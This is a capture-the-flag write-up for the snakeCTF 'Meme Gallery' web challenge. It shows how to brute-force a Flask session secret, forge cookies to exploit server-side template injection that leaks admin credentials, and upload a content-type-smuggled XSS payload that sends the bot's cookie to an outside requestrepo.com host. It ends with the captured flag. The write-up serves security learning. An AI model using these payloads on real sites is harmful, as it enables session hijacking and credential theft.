#python #flask #bruteforce #mime #xss 
# Snake24 - Meme Gallery
## Description
Share your favorite memes with the admins.
## Overview
It's a simple website that shows meme, and allows to register for uploading new ones.
There's a bot that opens submitted memes.
## Road to flag
The flag is in the bot's cookies:
```js
await page.setCookie({
	name: "FLAG",
	value: process.env.FLAG,
});
```
-> XSS
## Exploitation
1. Flask cookie secret bruteforce
```
flask-unsign -u -c ".eJyrViotTi1SslKqjlHKTIlRslIw1lGIAQvmJeamggRilBJTcjPzqmKUQDIFicXF5flFKVAZ
AiBGqVapFgBbhyF6.Zty9uw.D6SMBvdW64_svU-RcUNadr_DDYY" -w ~/Desktop/SecLists/Assetnote/rockyou.txt --
no-literal-eval
[*] Session decodes to: {'user': '{"id": 3, "username": "adminz", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 171264 attemptsideo
b'ilovememe'
```
Despite having the secret, It's not possible to forge a cookie for the admin user because the password has to be known:
```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        try:
            if not session.get("user"):
                return {"error": "Unauthorized"}, 302, {"Location": "/login"}
            logged_user = json.loads(session.get("user"), cls=UserDecoder)
            db = AppDataStorage(DB_FILE, OS_ADDRESS)
            res = db.find_user(logged_user.name)
            if res is None or res[2] != logged_user.password:
                return (
                    {"error": "Invalid token"},
                    500,
                    {"Set-Cookie": "session=;Max-Age=0;"},
                )
        except json.JSONDecodeError as e:
            session.pop("user", default=None)
            return {"error": str(e)}, 500, {"Set-Cookie": "session=;Max-Age=0;"}

        return f(logged_user, *args, **kwargs)

    return decorated
```
2. SSTI
But it's possible to forge cookies with arbitrary ids. `/user` is vulnerable to SSTI via the id field:
```python
@blueprint.route("/user", methods=["GET"])
@token_required
def user_info(user):
    return render_template_string(f"uid={user.id}({{{{name}}}})", name=user.name), 200
```
Forging the token:
```
flask-unsign -s -S "ilovememe" -c "{'user': '{\"id\":\"{{config}}\",\"username\":\"sebbb\",\"password\": \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"}'}"
```
Dumped config:
```
'ADMIN_USERNAME': 'admin', 'ADMIN_PASSWORD': 'hNm9Hyt#qD%E2Eh5CLeYNDASF@5X*#b$'
```
Forging admin token:
```
flask-unsign -s -S "ilovememe" -c "{'user': '{\"id\":\"0\",\"username\":\"admin\",\"password\": \"hNm9Hyt#qD%E2Eh5CLeYNDASF@5X*#b$\"}'}"
```
3. XSS
Report to admin route:
```python
@blueprint.route("/list/<meme>/maketheadminlaugh", methods=["GET"])
@token_required
@with_db
def report(db, user, meme):
    bucket = "supermemes"

    found = db.meme_bucket(meme)
    if found is None:
        return {"error": "Nonexistent meme is the new meme"}, 404
    if found != bucket:
        return {"error": "I'm not interested in this naive memes"}, 400
    res = requests.post(
        BOT_ADDRESS,
        data={"url": f"{current_app.config['APP_ADDRESS']}/get/{quote_plus(meme)}"}, #! potential traversal
    )

    if res.status_code == 200:
        return {"message": res.text}, 200

    return {"error": "Im ded x("}, res.status_code
```
The bot will open the uploaded image, so the only way to get XSS is by smuggling a mimetype that lets execute JS.
It's possible to return multiple [content-types](https://github.com/BlackFan/content-type-research/blob/master/XSS.md#response-content-type-tricks), so by uploading this:
```
Content-Disposition: form-data; name="file"; filename="xss.png"
Content-Type: image/png;,text/html

<script>
location = "//g106vnrl.requestrepo.com/?c"+document.cookie;
</script>
```
The 'image' will pass the checks and when sent to the bot the XSS will be executed.

`snakeCTF{w0w_7H1s_m3M3_R0ckS!!_528f2e8d95116437}`